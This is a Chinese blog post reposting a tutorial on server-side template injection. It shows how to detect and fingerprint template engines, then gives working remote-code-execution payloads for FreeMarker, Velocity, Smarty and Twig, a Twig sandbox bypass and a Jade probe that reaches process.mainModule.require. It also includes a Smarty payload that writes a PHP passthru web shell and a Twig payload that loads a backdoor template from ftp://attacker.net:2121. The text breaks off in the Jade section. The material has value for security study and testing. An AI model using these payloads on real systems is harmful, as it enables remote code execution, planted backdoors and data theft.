
<!DOCTYPE html>
<html lang="zh-CN" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Web:服务器模板注入攻击 - H3ng</title>
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="H3ng,"> 
    <meta name="description" content="原文：https://zhuanlan.zhihu.com/p/28823933
概述模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代,"> 
    <meta name="author" content="H3ng"> 
    <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.png"> 
    
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">

    
<link rel="stylesheet" href="/css/diaspora.css">

<meta name="generator" content="Hexo 5.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>

<body class="loading">
    <span id="config-title" style="display:none">H3ng</span>
    <div id="loader"></div>
    <div id="single">
    <div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
    <div title="播放/暂停" class="iconfont icon-play"></div>
    <h3 class="subtitle">Web:服务器模板注入攻击</h3>
    <div class="social">
        <div>
            <div class="share">
                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
            </div>
            <div id="qr"></div>
        </div>
    </div>
    <div class="scrollbar"></div>
</div>

    <div class="section">
        <div class="article">
    <div class='main'>
        <h1 class="title">Web:服务器模板注入攻击</h1>
        <div class="stuff">
            <span>七月 05, 2021</span>
            
  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag">漏洞利用</a></li></ul>


        </div>
        <div class="content markdown">
            <p>原文：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/28823933">https://zhuanlan.zhihu.com/p/28823933</a></p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a><strong>概述</strong></h2><p>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。与此同时，它也扩展了黑客的攻击面。除了常规的 XSS 外，注入到模板中的代码还有可能引发 RCE（远程代码执行）。通常来说，这类问题会在博客，CMS，wiki  中产生。虽然模板引擎会提供沙箱机制，攻击者依然有许多手段绕过它。在这篇文章中，我将会攻击几个模板引擎来说明该类漏洞，并展示沙箱逃逸技术。</p>
<h2 id="什么是服务端模板注入"><a href="#什么是服务端模板注入" class="headerlink" title="什么是服务端模板注入"></a><strong>什么是服务端模板注入</strong></h2><p>通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式。就拿一个销售软件来说，我们假设它会发送大量的邮件给客户，并在每封邮件前SKE插入问候语，它会通过Twig（一个模板引擎）做如下处理：</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$output</span> <span class="token operator">=</span> <span class="token variable">$twig</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">render</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'custom_email'</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"first_name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$user</span><span class="token punctuation">.</span>first_name<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>有经验的读者可能迅速发现 XSS，但是问题不止如此。这行代码其实有更深层次的隐患，假设我们发送如下请求：</p>
<pre class=" language-text"><code class="language-text">custom_email={{7*7}} // GET 参数

49  // $output 结果</code></pre>
<p>还有更神奇的结果：</p>
<pre class=" language-text"><code class="language-text">custom_email={{self}} // GET 参数

Object of class
__TwigTemplate_7ae62e582f8a35e5ea6cc639800ecf15b96c0d6f78db3538221c1145580ca4a5 could not be converted to string // 错误</code></pre>
<p>我们不难猜到服务器执行了我们传过去的数据。每当服务器用模板引擎解析用户的输入时，这类问题都有可能发生。除了常规的输入外，攻击者还可以通过 LFI（文件包含）触发它。模板注入和 SQL 注入的产生原因有几分相似——都是将未过滤的数据传给引擎解析。</p>
<p>为什么我们在模板注入前加“服务端”呢？这是为了和 jQuery，KnockoutJS 产生的客户端模板注入区别开来。通常的来讲，前者甚至可以让攻击者执行任意代码，而后者只能 XSS。</p>
<h2 id="模板注入的手法"><a href="#模板注入的手法" class="headerlink" title="模板注入的手法"></a><strong>模板注入的手法</strong></h2><p>根据我的经验，我总结出如下步骤：</p>
<p><img src="https://pic4.zhimg.com/80/v2-b7184f6422f3b507a713a5843bb00723_720w.jpg" alt="img"></p>
<h2 id="1：探测漏洞"><a href="#1：探测漏洞" class="headerlink" title="1：探测漏洞"></a><strong>1：探测漏洞</strong></h2><p>漏洞一般出现在这两种情况下，而每种有不同的探测手法：</p>
<h2 id="文本类"><a href="#文本类" class="headerlink" title="文本类"></a><strong>文本类</strong></h2><p>大部分的模板语言支持我们输入 HTML，比如：</p>
<pre class=" language-smarty"><code class="language-smarty">smarty=Hello <span class="token smarty"><span class="token delimiter punctuation">{</span><span class="token function">user</span><span class="token punctuation">.</span><span class="token variable">name</span><span class="token delimiter punctuation">}</span></span>
Hello user1

freemarker=Hello $<span class="token smarty"><span class="token delimiter punctuation">{</span><span class="token function">username</span><span class="token delimiter punctuation">}</span></span>
Hello newuser

any=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span>Hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span>Hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span></code></pre>
<p>未经过滤的输入会产生 XSS，我们可以利用 XSS 做我们最基本的探针。除此之外，模板语言的语法和 HTML 语法相差甚大，因此我们可以用其独特的语法来探测漏洞。虽然各种模板的实现细节不大一样，不过它们的基本语法大致相同，我们可以发送如下 payload：</p>
<pre class=" language-smarty"><code class="language-smarty">smarty=Hello $<span class="token smarty"><span class="token delimiter punctuation">{</span><span class="token number">7</span><span class="token operator">*</span><span class="token number">7</span><span class="token delimiter punctuation">}</span></span>
Hello 49

freemarker=Hello $<span class="token smarty"><span class="token delimiter punctuation">{</span><span class="token number">7</span><span class="token operator">*</span><span class="token number">7</span><span class="token delimiter punctuation">}</span></span>
Hello 49</code></pre>
<p>来确认漏洞。</p>
<h2 id="代码类"><a href="#代码类" class="headerlink" title="代码类"></a><strong>代码类</strong></h2><p>在一些环境下，用户的输入也会被当作模板的可执行代码。比如说变量名：</p>
<pre class=" language-text"><code class="language-text">personal_greeting=username
Hello user01</code></pre>
<p>这种情况下，XSS 的方法就无效了。但是我们可以通过破坏 template 语句，并附加注入的HTML标签以确认漏洞：</p>
<pre class=" language-text"><code class="language-text">personal_greeting=username<tag>
Hello
personal_greeting=username}}<tag>
Hello user01 <tag></code></pre>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h2><p>检测到模板注入后，我们需要判断具体的模板引擎。我们需要  fuzz 不同的字符，再通过返回的错误判断。当模板引擎屏蔽错误后，该类当法就失效了，并且暴力 fuzz 也对攻击自动化不友好。Burpsuite 则对不同模板接受的 payload 做了一个分类，并以此快速判断模板引擎：</p>
<p><img src="https://pic4.zhimg.com/80/v2-3321f46859c0be9e93f9ad79f3dd1cd3_720w.jpg" alt="img"></p>
<p>这里的绿线表示结果成功返回，红线反之。有些时候，同一个可执行的 payload 会在不同引擎中返回不同的结果，比方说49会在 Twig 中返回49，而在 Jinja2 中则是7777777。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h2><h2 id="读文档"><a href="#读文档" class="headerlink" title="读文档"></a><strong>读文档</strong></h2><p>读模板文献是构造 exp 的第一步。一般来讲，我们需要关注如下部分：</p>
<ul>
<li>‘Template 使用手册’，这一部分通常告诉我们基本的模板语法</li>
<li>‘安全问题’，在攻击模板时，它通常可以提供我们许多思路</li>
<li>内建方法，函数，变量，过滤器</li>
<li>插件/扩展——我们可以优先研究默认开启的</li>
</ul>
<h2 id="探环境"><a href="#探环境" class="headerlink" title="探环境"></a><strong>探环境</strong></h2><p>当我们构建出了可用 exp 后，我们需要考虑我们当前环境可利用的函数/对象。除了模板默认的对象和我们提供的参数外，大部分模板引擎都有一个包含当前命名空间所有信息的对象（比如 self），或者一个可以列出所有属性和方法的函数。</p>
<p>如果没有这样的对象或函数，我们需要暴力枚举变量名。我已在 FuzzDB 和 Burp Intruder 中公布了 fuzz 字典。</p>
<p>有些时候，开发者也会在模板中包含了一些敏感信息。不过这视情况而定，因此不在这里讨论。</p>
<h2 id="黑程序"><a href="#黑程序" class="headerlink" title="黑程序"></a><strong>黑程序</strong></h2><p>至此，读者已经了解如何利用这一攻击面了。但是我们需要提醒读者不要局限目光于通用特性，我们还需注意到不同开发者的实现细节。在余下的篇幅里，我会用模板注入来实现任意对象创建，任意文件读写，远程文件包含，信息泄露以及提权。</p>
<p>有些时候，攻破一个程序不需要多少时间，比如：{php}echo id;{/php}</p>
<p>这时，我们只需递交：</p>
<pre class=" language-jsp"><code class="language-jsp"><%
import os
x=os.popen('id').read()
%>
${x}</code></pre>
<p>即可</p>
<p>但是越来越多的模板会提供安全措施（比方说沙箱，过滤）来保证安全性，因此开发模板注入后门越来越难了。</p>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a><strong>案例</strong></h2><h2 id="FreeMarker"><a href="#FreeMarker" class="headerlink" title="FreeMarker"></a><strong>FreeMarker</strong></h2><p>FreeMaker 是 Java 下最受欢迎的模板引擎。喜出望外的是，这个模板的文档提到了安全问题：<br>Q:我可以允许用户递交模板吗？这又什么安全隐患吗？<br>A: 通常来讲，我们不允许这么做。除非用户是管理员或者可信任的用户。模板和 *.java 文件一样有威胁。如果你依然坚持这么做，那么你可以参考<a href="https://link.zhihu.com/?target=http://freemarker.org/docs/app_faq.html%23faq_template_uploading_security">这个</a></p>
<p>除了DoS等相对影响较小的问题，我们找到了个文献：<br>Configuration.setNewBuiltinClassResolver，Environment.setNewBuiltinClassResolve：它们在模板中可以这样调用：”com.example.SomeClass”? new()，虽然这两个函数对FTL库十分重要，但是不应该出现在一般的模板里。new 它会产生  TemplateModel，这个类有引起任意代码执行的隐患。</p>
<p>虽然这个描述并不详细，但是我们可以粗略得知new会导致安全问题，让我们来看看它的文档：</p>
<p>用户可以通过实现 TemplateModel 来用 new 创建任意 Java 对象</p>
<p>如果你想让用户上传模板，你应该看<a href="https://link.zhihu.com/?target=http://freemarker.org/docs/ref_builtins_expert.html%23ref_builtin_new">这里</a></p>
<p>TemplateModel 有什么神奇的东西呢？我们来看一看：</p>
<p><img src="https://pic2.zhimg.com/80/v2-23be041d36b1eba277b4303de9a5bc21_720w.jpg" alt="img"></p>
<p>Execute！这是不是一个可以执行代码的功能呢？为了验证 Execute，我们可以：</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Execute</span>
<span class="token keyword">implements</span> <span class="token class-name">TemplateMethodModel</span>
<span class="token comment" spellcheck="true">/*
给予FreeMaker执行命令权限，并将输入内联到模板里
*/</span></code></pre>
<p>果然和我们预料的一样：</p>
<pre class=" language-smarty"><code class="language-smarty">&lt;#assign ex="freemarker.template.utility.Execute"?new()> $<span class="token smarty"><span class="token delimiter punctuation">{</span> <span class="token function">ex</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span> <span class="token delimiter punctuation">}</span></span>
uid=119(tomcat7) gid=127(tomcat7) groups=127(tomcat7)</code></pre>
<p>这个 payload 会在后面大显身手。</p>
<h2 id="Velocity"><a href="#Velocity" class="headerlink" title="Velocity"></a><strong>Velocity</strong></h2><p>Velocity 同样是一款备受欢迎的模板语言。然而它没有默认变量列表和 <em>安全问题</em> 页面帮助我们构建 payload。下面展示了 Burp Intruder 在枚举变量名时的截图：（变量名在 payload 行，服务器结果在其右边）：</p>
<p><img src="https://pic4.zhimg.com/80/v2-eca8e9cbc67e9f08bccdb7caae3eefb7_720w.jpg" alt="img"></p>
<p>这幅图中，被高亮的 class 能返回对象，看上去十分有趣。谷歌一下，我们发现了<a href="https://link.zhihu.com/?target=https://velocity.apache.org/tools/releases/2.0/summary.html">如下描述</a>：<br>ClassTool：在模板中实现Java的反射，默认参数：$key</p>
<p>这里有几个可利用的方法和属性：<br>$class.inspect(class/object/string)：返回正在审查类或对象的ClassTool实例<br>$class.type：返回被审查的类</p>
<p>换句话说，我们可以通过这两个类获得任意对象信息。再利用目标的Runtime.exec()执行任意命令嗯。通过如下模板，我们可以验证这一点：</p>
<pre class=" language-jsp"><code class="language-jsp">$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor() //延迟了5秒</code></pre>
<p>得到 shell 命令输出有点麻烦（毕竟java）：</p>
<pre class=" language-jsp"><code class="language-jsp">#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end

//输出 tomcat7</code></pre>
<h2 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a><strong>Smarty</strong></h2><p>Smarty 是一款 PHP  的模板语言。它使用安全模式来执行不信任的模板。它只运行 PHP 白名单里的函数，因此我们不能直接调用  system()。然而我们可以从模板已有的类中进行任意调用。而文档表示我们可以通过 $smarty 来获取许多环境变量（比如当前变量的位置  $SCRIPT_NAME)。后面，我们又发现了 getStreamVariable:</p>
<p><img src="https://pic2.zhimg.com/80/v2-2d249e8cad5c5d0ed515abc5524b1051_720w.jpg" alt="img"></p>
<p>这个函数能任意读取有读写权限的文件：</p>
<pre class=" language-php"><code class="language-php"><span class="token punctuation">{</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getStreamVariable</span><span class="token punctuation">(</span>"file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///proc/self/loginuid")}</span>
<span class="token number">1000</span>
<span class="token punctuation">{</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getStreamVariable</span><span class="token punctuation">(</span><span class="token variable">$SCRIPT_NAME</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
<span class="token delimiter">&lt;?php</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"SMARTY_DIR"</span><span class="token punctuation">,</span><span class="token string">'/usr/share/php/Smarty/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token constant">SMARTY_DIR</span><span class="token punctuation">.</span><span class="token string">'Smarty.class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
<p>不仅如此，我们能任意调用静态方法，这当中包括一个可以创建和重写文件的方法public  function writeFile($_filepath, $_contents, Smarty  $smarty)。通过该方法，我们能轻松在web目录下创建后门。值得注意的是，第三个参数必须为 Smarty 对象，所以我们要想办法得到  Smarty 对象的引用。</p>
<p>幸运的是，self::clearConfig帮助我们获取对象：</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> function <span class="token function">clearConfig</span><span class="token punctuation">(</span>$varname <span class="token operator">=</span> null<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token keyword">return</span> Smarty_Internal_Extension_Config<span class="token operator">:</span><span class="token operator">:</span><span class="token function">clearConfig</span><span class="token punctuation">(</span>$<span class="token keyword">this</span><span class="token punctuation">,</span> $varname<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>最后，我们就可以创建后门了！</p>
<pre class=" language-php"><code class="language-php"><span class="token punctuation">{</span>Smarty_Internal_Write_File<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token variable">$SCRIPT_NAME</span><span class="token punctuation">,</span><span class="token string">"&lt;?php passthru($_GET['cmd']); ?>"</span><span class="token punctuation">,</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">clearConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre>
<h2 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a><strong>Twig</strong></h2><p>Twig 和 Smarty  类似，不过我们不能用它调用静态方法。幸运的是，它提供了 _self，我们并不需要暴力枚举变量名。虽然 _self 没什么有用的方法，它提供了指向 Twig_Environment 的env 属性。Twig_Environment 其中的 setCache 方法则能改变 Twig 加载  PHP 文件的路径。这样一来，我们就可以通过改变路径实现 RFI了：</p>
<pre class=" language-twig"><code class="language-twig"><span class="token tag"><span class="token ld"><span class="token punctuation">{{</span></span><span class="token property">_self</span><span class="token punctuation">.</span><span class="token property">env</span><span class="token punctuation">.</span><span class="token property">setCache</span><span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>ftp://attacker.net:2121<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token rd"><span class="token punctuation">}}</span></span></span><span class="token tag"><span class="token ld"><span class="token punctuation">{{</span></span><span class="token property">_self</span><span class="token punctuation">.</span><span class="token property">env</span><span class="token punctuation">.</span><span class="token property">loadTemplate</span><span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>backdoor<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token rd"><span class="token punctuation">}}</span></span></span></code></pre>
<p>但是，PHP 默认禁止远程文件包含（关闭 allow_url_include），因此上述 payload 不能生效。进一步探索，我们在 getFilter  里发现了危险函数 call_user_func。通过传递传递参数到该函数中，我们可以调用任意 PHP 函数：</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getFilter</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filterCallbacks</span> <span class="token keyword">as</span> <span class="token variable">$callback</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">!==</span> <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$callback</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token variable">$filter</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">registerUndefinedFilterCallback</span><span class="token punctuation">(</span><span class="token variable">$callable</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filterCallbacks</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$callable</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>我们只需注册 exec 为 filter 的回调函数，并如此调用：</p>
<pre class=" language-twig"><code class="language-twig"><span class="token tag"><span class="token ld"><span class="token punctuation">{{</span></span><span class="token property">_self</span><span class="token punctuation">.</span><span class="token property">env</span><span class="token punctuation">.</span><span class="token property">registerUndefinedFilterCallback</span><span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>exec<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token rd"><span class="token punctuation">}}</span></span></span><span class="token tag"><span class="token ld"><span class="token punctuation">{{</span></span><span class="token property">_self</span><span class="token punctuation">.</span><span class="token property">env</span><span class="token punctuation">.</span><span class="token property">getFilter</span><span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token rd"><span class="token punctuation">}}</span></span></span>

<span class="token other">//返回结果： uid=1000(k) gid=1000(k) groups=1000(k),10(wheel)</span></code></pre>
<h2 id="Twig（沙箱模式）"><a href="#Twig（沙箱模式）" class="headerlink" title="Twig（沙箱模式）"></a><strong>Twig（沙箱模式）</strong></h2><p>Twig 的沙箱模式有额外的限制。它会禁用一部分函数（包括开发者提供的对象），因此我们并不能调用有价值的东西。万幸的是，这部分代码帮助我们突破限制：</p>
<pre class=" language-twig"><code class="language-twig"><span class="token other">public function checkMethodAllowed($obj, $method)
{
  if ($obj instanceof Twig_TemplateInterface || $obj instanceof Twig_Markup) {
  return true;
}</span></code></pre>
<p>这里，我们可以调用实现 Twig_TemplateInterface 的对象，也就是说我们可以简介使用 _self.，_self.中的 displayBlock 让我们更上一层楼：</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">displayBlock</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$context</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$blocks</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$useBlocks</span> <span class="token operator">=</span>
<span class="token boolean">true</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$useBlocks</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$blocks</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$template</span> <span class="token operator">=</span> <span class="token variable">$blocks</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$block</span> <span class="token operator">=</span> <span class="token variable">$blocks</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blocks</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$template</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blocks</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$block</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blocks</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$template</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token variable">$block</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">null</span> <span class="token operator">!==</span> <span class="token variable">$template</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
      <span class="token variable">$template</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$block</span><span class="token punctuation">(</span><span class="token variable">$context</span><span class="token punctuation">,</span> <span class="token variable">$blocks</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Twig_Error</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
<pre><code>我们可以用$template -&gt;$block($context,  $blocks)绕过白名单限制。以下的代码会调用 userObject 对象的  vulnerableMethod：{{_self.displayBlock("id",[],{"id":[userObject,"vulnerableMethod"]})}}。虽然现在不能获得化境变量，但我们可以利用 _context 属性查找开发者自定义的对象并调用有用的目标。</code></pre>
<h2 id="Jade"><a href="#Jade" class="headerlink" title="Jade"></a><strong>Jade</strong></h2><p>Jade 是一款 Node.js 模板引擎。<a href="https://link.zhihu.com/?target=http://CodePen.io">http://CodePen.io</a> 则可以接受用户递交该模板。这里，我会展示如何对模板注入进行黑盒测试。</p>
<p>首先，让我们来确认模板可以执行代码：</p>
<pre class=" language-jade"><code class="language-jade"><span class="token punctuation">=</span><span class="token code"> <span class="token number">7</span><span class="token operator">*</span><span class="token number">7</span></span>

<span class="token comment" spellcheck="true">//结果：49</span></code></pre>
<p>再来确认 self 对象的位置：ja</p>
<pre class=" language-jade"><code class="language-jade"><span class="token punctuation">=</span><span class="token code"> root</span>

<span class="token comment" spellcheck="true">//结果：[object global]</span></code></pre>
<p>我们来列一下对象属性和函数：</p>
<pre class=" language-jade"><code class="language-jade"><span class="token punctuation">-</span><span class="token code"> <span class="token keyword">var</span> x <span class="token operator">=</span> root</span>
<span class="token punctuation">-</span><span class="token code"> <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> prop <span class="token keyword">in</span> x<span class="token punctuation">)</span></span>
, #{prop}

, ArrayBuffer, Int8Array, Uint8Array, Uint8ClampedArray<span class="token punctuation">...</span> global, process, GLOBAL, root</code></pre>
<p>这些可能是可利用的函数：</p>
<pre class=" language-jade"><code class="language-jade"><span class="token punctuation">-</span><span class="token code"> <span class="token keyword">var</span> x <span class="token operator">=</span> root<span class="token punctuation">.</span>process</span>
<span class="token punctuation">-</span><span class="token code"> <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> prop <span class="token keyword">in</span> x<span class="token punctuation">)</span></span>
, #{prop}

, title, version, moduleLoadList<span class="token punctuation">...</span> mainModule, setMaxListeners, emit, once</code></pre>
<p>绕过保护机制：</p>
<pre class=" language-jade"><code class="language-jade"><span class="token punctuation">-</span><span class="token code"> <span class="token keyword">var</span> x <span class="token operator">=</span> root<span class="token punctuation">.</span>process<span class="token punctuation">.</span>mainModule</span>
<span class="token punctuation">-</span><span class="token code"> <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> prop <span class="token keyword">in</span> x<span class="token punctuation">)</span></span>
, #{prop}

因为安全原因，CodePen阻止了你的语句
请删除下列关键字后进行尝试
<span class="token punctuation">-</span><span class="token code"><span class="token operator">></span>process</span>
<span class="token punctuation">-</span><span class="token code"><span class="token operator">></span>mainModule</span>

<span class="token punctuation">-</span><span class="token code"> <span class="token keyword">var</span> x <span class="token operator">=</span> root<span class="token punctuation">.</span>process</span>
<span class="token punctuation">-</span><span class="token code"> x <span class="token operator">=</span> x<span class="token punctuation">.</span>mainModule</span>
<span class="token punctuation">-</span><span class="token code"> <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> prop <span class="token keyword">in</span> x<span class="token punctuation">)</span></span>
, #{prop}

, id, exports, parent, filename, loaded, children, paths, load, require, _compile</code></pre>
<p>确定有用的函数：</p>
<pre class=" language-jade"><code class="language-jade"><span class="token punctuation">-</span><span class="token code"> <span class="token keyword">var</span> x <span class="token operator">=</span> root<span class="token punctuation">.</span>process</span>
<span class="token punctuation">-</span><span class="token code"> x <span class="token operator">=</span> x<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span>require</span>

